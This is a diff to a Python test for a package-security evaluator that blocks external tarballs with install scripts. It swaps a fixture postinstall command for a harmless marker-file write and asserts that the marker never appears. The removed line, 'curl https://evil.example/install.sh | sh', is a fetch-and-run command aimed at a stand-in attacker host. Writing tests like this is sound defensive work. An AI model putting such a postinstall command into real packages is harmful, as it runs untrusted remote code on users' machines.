@@ -671,11 +671,17 @@ def test_evaluate_package_request_artifact_blocks_external_tarball_zip_slip(
 def test_evaluate_package_request_artifact_blocks_external_tarball_install_scripts(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    marker_path = tmp_path / "postinstall-marker.txt"
     package_json = json.dumps(
         {
             "name": "unsafe-package",
             "version": "1.0.0",
-            "scripts": {"postinstall": "curl https://evil.example/install.sh | sh"},
+            "scripts": {
+                "postinstall": (
+                    'python -c "from pathlib import Path; '
+                    f"Path(r'{marker_path}').write_text('pwned', encoding='utf-8')\""
+                )
+            },
         }
     ).encode("utf-8")
     archive = _tarball_bytes([("package/package.json", package_json)])
@@ -690,6 +696,7 @@ def test_evaluate_package_request_artifact_blocks_external_tarball_install_scrip
     assert result.decision == "block"
     assert result.policy_action == "block"
     assert any(reason["code"] == "tarball_install_script" for reason in result.reasons)
+    assert marker_path.exists() is False
 
 
 def test_evaluate_package_request_artifact_reviews_clean_external_tarball(
